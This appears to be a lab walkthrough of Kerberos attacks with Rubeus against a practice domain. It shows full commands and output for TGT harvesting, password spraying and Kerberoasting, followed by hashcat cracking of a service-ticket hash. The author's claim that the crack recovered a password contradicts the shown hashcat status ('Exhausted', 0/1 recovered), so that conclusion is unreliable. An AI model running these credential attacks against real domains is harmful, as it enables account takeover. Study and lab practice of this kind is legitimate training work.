

# Rubeus

`Rubeus` is a powerful tool for attacking `Kerberos`. 

Rubeus is an adaptation of the kekeo tool and developed by HarmJ0y the very well known active directory guru.

Rubeus has a wide variety of attacks and features that allow it to be a very versatile tool for attacking Kerberos. Just some of the many tools and attacks include overpass the hash, ticket requests and renewals, ticket management, ticket extraction, harvesting, pass the ticket, AS-REP Roasting, and Kerberoasting.

The tool has way too many attacks and features for me to cover all of them so I'll be covering only the ones I think are most crucial to understand how to attack Kerberos however I encourage you to research and learn more about Rubeus and its whole host of attacks and features here - https://github.com/GhostPack/Rubeus


Note Rubeus needs to be on Target, ie it needs to be trasfered

We can do

1. Harvesting Tickets with `Rubeus.exe`
    Harvesting gathers tickets that are being transferred to the KDC and saves them for use in other attacks such as the `pass the ticket attack.`
    `Rubeus.exe harvest /interval:30` - This command tells Rubeus to harvest for `TGT`s every 30 seconds

2. Brute-Forcing and Password-Spraying with Rubeus
    `Rubeus.exe brute /password:Password1 /noticket` - This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user

3. Kerberosting with `Rubeus`
    `Rubeus.exe kerberoast`

*************************************************************************************************************************

# Harvesting Tickets with `Rubeus` - 

Harvesting gathers tickets that are being transferred to the KDC and saves them for use in other attacks such as the `pass the ticket attack.`


controller\administrator@CONTROLLER-1 C:\Users\Administrator> `cd Downloads`
controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>`dir`
 Volume in drive C has no label.
 Volume Serial Number is E203-08FF

 Directory of C:\Users\Administrator\Downloads

05/25/2020  03:45 PM    <DIR>          .
05/25/2020  03:45 PM    <DIR>          ..
05/25/2020  03:45 PM         1,263,880 mimikatz.exe
05/25/2020  03:14 PM           212,480 Rubeus.exe
               2 File(s)      1,476,360 bytes
               2 Dir(s)  50,892,767,232 bytes free

    

# `Rubeus.exe harvest /interval:30` - This command tells Rubeus to harvest for `TGT`s every 30 seconds

controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>`Rubeus.exe harvest /interval:30`

   ______        _                       
  (_____ \      | |                      
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[*] Action: TGT Harvesting (with auto-renewal) 
[*] Monitoring every 30 seconds for new TGTs
[*] Displaying the working TGT cache every 30 seconds


[*] Refreshing TGT ticket cache (4/20/2024 5:52:32 AM)

  User                  :  CONTROLLER-1$@CONTROLLER.LOCAL 
  StartTime             :  4/20/2024 2:56:01 AM
  EndTime               :  4/20/2024 12:56:01 PM
  RenewTill             :  4/27/2024 2:56:01 AM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable 
  Base64EncodedTicket   :

    doIFhDCCBYCgAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr
    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQoMIIEJKADAgESoQMCAQKiggQWBIIEEpiemNAt4L/G8+0weqQJ0N8R/xqSfGSIEJk2
    rfhb43HEpNiX3IrQYJc1pvfav7wkN/1Loiahmt0RCMCvgHVBZBpPq+WIs88KRVMKxmqqEREzyITKcPdSTu/ktvr69hhnnh+eUraf
    gujYvn+T5s972wdGkMoaccaYbBCZjMD4cKeilqF48JDo00PR/T2fgPoTex3y6C1kbB1rzoEmgwKxx7wgEteEDvqJhLDhygy1LV53
    HVyf3DgvD4GDQlbgytc1IJ3yvx2yEZixUlU4qlLOJAuGQJgFU+lX13DkU2GIPQ0BtG9UPsM7ndtPFHZD3C9GJ26EtUpHgGK6Dh7u
    WUqMTfpDwXR88DIiWzAn2CqVgh+GnleAAYf1mvpYUW0HpWKsrUMsLPBlVNPnKrkxkNSqfaB8m2WIDQaX290EzcegWll3U+uw/5Ek
    lXA4brN8CXx8tcOEAPwNxh/2fntlt3WKQc2grW0ONVXLjq7ObmS9WkUFQq/lvGOf9BslLWtgBN9XejR9zKaq8AoNrfyOjl+IISKy
    y7iz95uEsoEa6tWDa9xOq2zPJpSKrrzoBox0mTG+lGsdplTy9ueYcek4Im8UY89km2mckdgMGSd15leldMnTd4YHGE2rLwKyJhiU
    9FqgoNpoUEM+OFMZbcICa8gxvI7Ng6OYPDDOQLzGADVl9dbxgg0sDeQPW6/fTCZfkWhaTGjr6Pi1+8ulcs9bkYDr+ryF9mgP1FIc
    FFL2aRTsPikUy0GrWHmeWoGtmeQ2OyyGAl5d+x6e2OnZJvMT1Q57oQ+bQPWDTta/XXW7A0sy0qXro/Gfw7vInowJQAn2xm2VYNmR
    s1dS2OIKaBqh75W/8CkscZlMRRwWmLozK0k017/RTeISST4PRPNZDaOQTqmjtBs0P5cM8JXdSc1C9mku7Yl46Co/+LnmK+567L1/
    S+e2nAYrKJ0bh3Yk2amHNZq9h8t+QGXRV5WspVtPk2Qp35WcjMUJp9XH1kBwp9V5UFIa5bYyJycsVt5dAvBUbEH4EhPgTbSb8H0h
    wJRU9NzFqYHWNGzcufILZgxDAw67uNQ4UotLHALqH66gm8KogX40IYmyL79rJvvZz57o8YBIWnqFAoVa4MvWTOHrU94Fmwp8zi2r
    ZJoTvAbHU1tvyYUHNEMrYQwinvi1znV2VGUKw6SX/I/kUYx1aHM6c+unl2sGM73NRNXMwQNmRe/M9vT9qnRmWaJzfVACCPsLKJhn
    blt64twGKzNEVuNtTxPCim1HMD5/0J3St+vT9ZrrZhLt93+p3z5lF8kotFtc/1VlACJaR9SaGk19lqItXl+6NjDkGJB7YnY7JoUX
    bKxCHHmxArogDL21Spuo4jQrVS7v4ILvtdPMHdPEw07/cMQGLxmNXg+jgfcwgfSgAwIBAKKB7ASB6X2B5jCB46CB4DCB3TCB2qAr
    MCmgAwIBEqEiBCCRVu/Z1UnZt4esHj5jKe5ICuHrKbBQD8oMkbwnpao0OKESGxBDT05UUk9MTEVSLkxPQ0FMohowGKADAgEBoREw
    DxsNQ09OVFJPTExFUi0xJKMHAwUAQOEAAKURGA8yMDI0MDQyMDA5NTYwMVqmERgPMjAyNDA0MjAxOTU2MDFapxEYDzIwMjQwNDI3
    MDk1NjAxWqgSGxBDT05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLkxPQ0FM


# Brute-Forcing and Password-Spraying with Rubeus

Rubeus can do both brute force passwords as well as password spray user accounts. When brute-forcing passwords you use a single user account and a wordlist of passwords to see which password works for that given user account. In password spraying, you give a single password such as Password1 and "spray" against all found user accounts in the domain to find which one may have that password.

1. `Password Spraying` with Rubeus

# R`ubeus.exe brute /password:Password1 /noticket` - This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user

controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>`Rubeus.exe brute /password:Password1 /noticket`

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[X] Error resolving hostname 'CONTROLLER.local' to an IP address: No such host is known

[X] Unable to get domain controller address


# Lets add it to host file and try again

controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>`echo 10.10.229.169 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts`

controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>`Rubeus.exe brute /password:Password1 /noticket`

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[-] Blocked/Disabled user => Guest
[-] Blocked/Disabled user => krbtgt
[+] STUPENDOUS => Machine1:Password1
[*] base64(Machine1.kirbi):

      doIFWjCCBVagAwIBBaEDAgEWooIEUzCCBE9hggRLMIIER6ADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyi
      JTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIubG9jYWyjggQDMIID/6ADAgESoQMCAQKiggPx
      BIID7dCH/kbXBrRbj69wpAUgslttjYazsyWvxjRAiPU3fOnFQNGE7dEc9Iy9hYNpeKy4scHzytN03SkJ
      xd6F2XD6U35xObfbkfyUGzjpQ0LOo5oYGa4ZmK2P50tRBl5at8u7fYrqxtaAa2/4BNEuL8Xc8PUPPtV/
      neezK07fBldxf6Kl7MTS2MMApXlzjeTMyZeH+fBa2mxzIWov0kX2yJLDN9Rx9yAkX/ApgY4E9J9Hixkp
      RIy5dXYMdOZOdT7qsEe2/0U5R4B0KH15GYmfkzlxHKlx6Ni8ReO3WmGf/b4JU1fZbd174mbobbyzRlYA
      R46iZ+JPel3GPvvvTboYBXKVALeyg2gwUkAnta1/ccMT4Nu2Zv1JThhB0YQ3OiywjbREiAZNsyIeVTBE
      tpADNuKigtZWHmO+irHm98jFamaLisQ/04+cpmoHLqpq3EVnw2RryDlAuBTargSLKClYjhgzN/qyrvRm
      FnpWCeIbnwvdFmzWQwScmHdjRCGreZWO/uQdv3eufoHmsJuSKmQ9rHVle324prCK/RRmO80IYDYwiFcc
      mSPcOQmSgeniuSKSRKs0pnz9jbhAr3zK8rDilOL8CpBSD0+DI9buj9YRFjxiY2bOm+Cb4Ip+QNDci7wk
      jV5tgvcRr2sJRlUqi0yr+Xz0bd8ECvTLf6oefKi90cHFNH83L93N5SueLxET1+I4FCfDc357Z1moTpoW
      HdXWRvGjYUzkpYwT7brjqMLVb0+kvewI4X3kQP28kfYf5Ltqr5dtEZpeIDVFCuiEYoOIAHaFgU9j7RPe
      8xJmxDFsdXDnBPHamCYPck4NYn0asC5Dm6uKcC3JZwkDTI9PdtbmBvUNY37It1kEWb8PDHqR+DsxvQgn
      /HIAihiabrfkhpLr7miIae/vb/DEFUhPrlRL8tqoNf+fzDvWJuiuKxMDodIoXwQBLYtRkS85L+tT6G2+
      tqRax/kZEXHuCSDbi4qwxtOQlHadEUCtow9yHQML3rE6hlAyl7WKo5IlOCikRHeWTeEevM3qbXNFp3ub
      WqJ4tvU3W6CMPTOIkWdOhdwqOO21LsvFvjjSCFCQ9MaoS4Ss7lP3iVqfvPQF+Ue9+E0nqzpi+eIFFjGp
      LLSZtTseAgB8rtKxNJObQGofjbP78LzR0VkaBLibPIUQ7QuqffViGXG9e2iUm961gxhPYdyRxj5CAV9y
      qHQXc290ZmHbbQdbFy4G7CZdDqgD/e3bJ0I1qmJ7qDufHbkEwOvZo1oisq4fF3BY0/WAnvW7gQS8mdsD
      hQmDJXruYo1OJ/+Xeh6NRMS3CgBNoos9EC610YqvOF2ErY3aCb/LUubDoaZdD4uma6OB8jCB76ADAgEA
      ooHnBIHkfYHhMIHeoIHbMIHYMIHVoCswKaADAgESoSIEIHKziKYW16qaH6qYTFzkklF7U0hXCajRAQBF
      pYKAdEuwoRIbEENPTlRST0xMRVIuTE9DQUyiFTAToAMCAQGhDDAKGwhNYWNoaW5lMaMHAwUAQOEAAKUR
      GA8yMDI0MDQyMDEyNTkzN1qmERgPMjAyNDA0MjAyMjU5MzdapxEYDzIwMjQwNDI3MTI1OTM3WqgSGxBD
      T05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLmxvY2Fs



[+] Done


controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>


We got the user which has Password1

NOTE - This attack may lock you out of the network depending on the account lockout policies.


#  Kerberosting with `Rubeus`

command - `Rubeus.exe kerberoast`

controller\administrator@CONTROLLER-1 C:\Users\Administrator> `cd Downloads`
controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>`dir`
 Volume in drive C has no label.
 Volume Serial Number is E203-08FF

 Directory of C:\Users\Administrator\Downloads

05/25/2020  03:45 PM    <DIR>          .
05/25/2020  03:45 PM    <DIR>          ..
05/25/2020  03:45 PM         1,263,880 mimikatz.exe
05/25/2020  03:14 PM           212,480 Rubeus.exe
               2 File(s)      1,476,360 bytes
               2 Dir(s)  50,892,767,232 bytes free
controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>`Rubeus.exe kerberoast`

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

 
[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts. 
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts. 

[*] Searching the current domain for Kerberoastable users

[*] Total kerberoastable users : 2


[*] SamAccountName         : SQLService
[*] DistinguishedName      : CN=SQLService,CN=Users,DC=CONTROLLER,DC=local
[*] ServicePrincipalName   : CONTROLLER-1/SQLService.CONTROLLER.local:30111
[*] PwdLastSet             : 5/25/2020 10:28:26 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*SQLService$CONTROLLER.local$CONTROLLER-1/SQLService.CONTROLLER.loca 
                             l:30111*$1E5F022293A9DEFB9EB83632AF1B08B4$0A7211B3B4F57D8753642FA0736736A05FC433 
                             274D81D815895DE6B8FA4017C975C406F1D909ACDE88181D0A03E9C38B3857606526FDD1728A565E
                             6CA9B61711383E7FC25DC625A0649FF72053A1C7F55967AAEE572CAE7834256FA4F260A824BD34DD
                             42E97EE9C65BB1ECE7460993129AE64049BFC5381A31D32A4C4AC088081903AC18D00920DC964373
                             9034FD17463A4A510CA1F64AC30C86BBA007613904FF84AA9CF812CF0378CAD94A6833932E8ECE37
                             17348E3364DE027FBE26D8F6CDD6F73D0794464F58041110B74C25982771147B10B6DCDCE8584F0F
                             0DA7CD1C7327D0778DC68DC89F9016A1640609AF25DE2219871A9A89589068DD01D621B3BCB8EE02
                             EB96A214E1B56B2D9B13B0F90EBDDDC7F171E62448B8B35DD4A6145420E39828C1AD7ECE3D93CD19
                             148F6DF0C0247D7E62903C8910730A8E2D5183D678589F3C55AED010498DC022470C7B2CD449DAA3
                             730875AEB38011D95571CCA37DB947A9EB6D5983EFF86757276FA66965EDF7E4853D59D3E880F031
                             13B572C101FEE4CD9EF893032E399EF3D17180822D1DE40C4E81259499027B0E1C8D57DA84B86F9B
                             98CEC5949D0517652C4563D4EF1E2C438E079C2ED25177C0AF2A258FA9BCE6D8D0D6F6EE84411D7B
                             2B737E842C77F6BA813DABC1315022D6B558F20F01340BF99B62D2010E9A43ED479A3C7A8204AF52
                             A92F1DF0D276612E1DE1F7A270026D1138AC1AB7258A386BF679F9DC1551CD4F9B3DE8E31018A768
                             CA8DF495F2AE39AF545EC9A80099188BEFAC50B95260A87E1AEE9C414BF2F68114CD0032742A576E
                             2C436234225C4E99959EFB7D8DAA7AFE9CCCDDA86D227A48C80D95CD82364B864D347820F46F8ED5
                             37893EB881747F14A23240EE673A0B998C64DDFAB2594065EBC7E35982DA732E3F7D2BD02A9FF21D
                             4809DAFC4D614530237915ED90CC7129AF68BCF77B59BBFE2495CC09D43F59CC33D9596472E1D861
                             50FC48D728D1481121FA8DEDE38B7695CEF660DF02DB1C08E0D8F4FFFFA69785761E367ED0F61158
                             0F53ACB62A1B1D236989794580DC80DACBFADCAD26F3D0ED2E7BCAF75A80AABBB077E194E23D59DC
                             F443365AA16ACCD38E8F9FE852E4FE2D3B57A3A3B22D197CBB1718EED17BB0D397072D49C2D20250
                             B4C042E6CCE6E29F37DF66B40ACC31C92868CAD24C017AA05125C59501D96C876FD4923A6E9F5CB0
                             61E4221F2C496C46EECF0863442C10BC0A0325A6EE15009A8838CAA8A59BEC586D18CE2747E98AB3
                             E45AF7331652D901FE8F238A0FB684E427E589D2E617D6D726EBD28A72BCDF6905D0154F23133047
                             2EC2AABF5F0977A73E60E37D64C830F02226A30B08D760E2CB053814F8EEE0A4E148D1354D7F39AA
                             C5FEE6AF682C84821C11EB802718AB0327F773249F3C3858FCA96FDF33271145614021F0FE6C18A2
                             7F4B47119FD85C66652F85996CAFF33ACC21A02630CAC12B85730519E81C57C47FAFD3852677ABA5
                             1B60C8FDCB0AED3DF1A5B75496954AD3F69F271B0F2D9DFFA8F8862E3973203863ABFB425892E90A
                             FE07164730059EE322BDCD129C323E64CE0FA169672CDA4F20DB8ABC6459635275423BC2BCEA7AEA
                             E7E0E016197E43B53E4F6DCF1FF9B631BB0D9AF005715F862C8E6F8C8C


[*] SamAccountName         : HTTPService
[*] DistinguishedName      : CN=HTTPService,CN=Users,DC=CONTROLLER,DC=local
[*] ServicePrincipalName   : CONTROLLER-1/HTTPService.CONTROLLER.local:30222
[*] PwdLastSet             : 5/25/2020 10:39:17 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*HTTPService$CONTROLLER.local$CONTROLLER-1/HTTPService.CONTROLLER.lo
                             cal:30222*$C5574BD1BFF0B2DE96193BF1F75BACEE$E3043484993F64B14491E31A75E61CA79888
                             6248582ACC9B16BC803C856F2CAB4CD1A1A689DABB11026EB2801E20301C6E0720CEE5B048ADB8F9
                             384625802D55147199B9B5F05E3B3D4B44C4A7DDDB3144D5C83136AC64917EB24CD265AAC4E28F6A
                             CD474451CFB83546409F8CDA54B5F43C36A13EA8D11650F2AC1A523E8CE8128AD4DA782FA1B73B87
                             29407EAB7800FF4D55524BB6BAC9641B7E548F742EB6568C712C4FF7E8A9E71E5349FF141177EC22
                             0DA24A9DE75ED35495D3DB4C4A0DD264E5AA25FB15280BFE8EA6639988A6665823A35E1ECF6F4830
                             36BDCC2BA5D434F02961936CE5BFAE5AF1DCA2584793D18B69222D1F533C270616522549B4E19F83
                             96A61773A3A6FADF469EA879649F0542C8FDF989615FAC422E5405478683123CAF6CBCEF6A090961
                             89505C28F25F62A0215275D359513909FB400EFCB5A0D3B44BBCFE1B1474300FB50CCCC4CA4D459D
                             C5981C3E76E8D14681392CC033C905EDCA913308F1998A20CB84CDAD03B98A2997563C6201EEAC3C
                             BE7223314332FD608028A0DE775A10836EA20A7CCF1A1C94D370C34B89204714F930EA27AE887BDB
                             4BD8131E9578A2289246C13B33A8613A218D87D1A337CB634E5AC955C1139D6265A2DDBA4B1F4330
                             821036385D3E02546AD3D271FE6AE575C39322FA0EDC330413A99C853734CF4E73497174D3C540B2
                             F61B20837EB3438C3A26B27B24FE0CEC777730D8C1675836BA12EE22750BDA57DBC256BFD1C7C8EA
                             4318CFEF400CBB74A5247FE0A1690DD6D269E8A212DC45F3035B440ED2780BCB7FAC2ED8FB56127E
                             A529A9763AC70C6D442128571AEF5D6D6C5F0D29790E52AE6F5F036937D82C2C1929EA83353D5A87
                             346C0BB0A338432D939637BB621C91EE2B366E1F69C9FC509F9A8606590B3A2670B755978226989F
                             9A48A054D5910AF59453EE57D925F113EB22DADE9592708B670800CF9B216EC39A509E5F58E67C8D
                             4DB73E44C306832E4AEE87EB5FC759BE17213025B4D75FF9BDA37A2860BF582495437804EBED7E43
                             C20CEDE8483F4B1B4932ECDEC9773233EBEDACE10250D055E923E3F523FDFDB6C18A06710796A84B
                             50FFF3F3ACAEBEA58F38E0578F62E2330D89AE101F2650325F54A3B0BE9EABF44B1C7E5D53BA3734
                             6C0A37EE7877CDB5A58AFF94B6DE87F25D20DA0F52A2513F198B22AFF060FE3190B29D6AFCBEA4FC
                             50591A7762912852BDCCD5A1AE21DBE7025FD309DFC291002EFB765195931FA1E97F45C5B51E2D68
                             D3DDE2D287BCC9BA870F1FD5838C96A1EF81DB9CCA753A84853E16A148751DD4CBC824AA4780F7C4
                             EB61B9806DB545825C510ECD74E0A47860DE0B4836E342B1DAAB010F9B37A09719D4E0013FD9AFFC
                             AE536889EA8DB96A42BE9524E9AC8031E825240D7429896FBD2FD494ED6EC368E447DED95269FF65
                             1B503CC174B55496145E70C87CD0A5FE5FE6E58D178DCE34F56489F6D5CA7DEF6A3A353E1EDD4374
                             29B40F3320EF0FA9955B0AE19BC996DD0E7EE76E6F4C51B105CE834BA6DF1DBCAB0320527381144B
                             BB1F09FBC8118901CAA8D0C0E8C2ECC48B9C1A5AC135110D468F9327B218BD2FF487B3485332B00C
                             2337F9D23466A300395DEF58EE566432B14097F4E5AEF81882C4B087651A


controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads> 


We Got hash for two diffrent `Service Principal Name` , Lets crack First Hash



┌──(kali㉿kali)-[~]
└─$ `nano Kerberoshash.txt`

┌──(kali㉿kali)-[~]
└─$ `hashcat -m 13100 -a 0 Kerberoshash.txt rockyou_modified.txt` 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i3-8130U CPU @ 2.20GHz, 1438/2940 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashfile 'hash.txt' on line 2 (148F6D...C80D95CD82364B864D347820F46F8ED5): Separator unmatched
Hashfile 'hash.txt' on line 3 (37893E...26EBD28A72BCDF6905D0154F23133047): Separator unmatched
Hashfile 'hash.txt' on line 4 (2EC2AA...F9B631BB0D9AF005715F862C8E6F8C8C): Separator unmatched
Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: rockyou_modified.txt
* Passwords.: 1240
* Bytes.....: 9706
* Keyspace..: 1240
* Runtime...: 0 secs

Approaching final keyspace - workload adjusted.           

Session..........: hashcat                                
Status...........: Exhausted
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*SQLService$CONTROLLER.local$CONTROLLER...93cd19
Time.Started.....: Sat Apr 20 09:29:05 2024 (0 secs)
Time.Estimated...: Sat Apr 20 09:29:05 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou_modified.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   586.3 kH/s (0.44ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 1240/1240 (100.00%)
Rejected.........: 0/1240 (0.00%)
Restore.Point....: 1240/1240 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: paulina -> hello123
Hardware.Mon.#1..: Util: 27%

Started: Sat Apr 20 09:29:04 2024
Stopped: Sat Apr 20 09:29:07 2024


We got the result paulina -> hello123


Now lets see Kerberosting using Impacat's `GetUserSPN.py`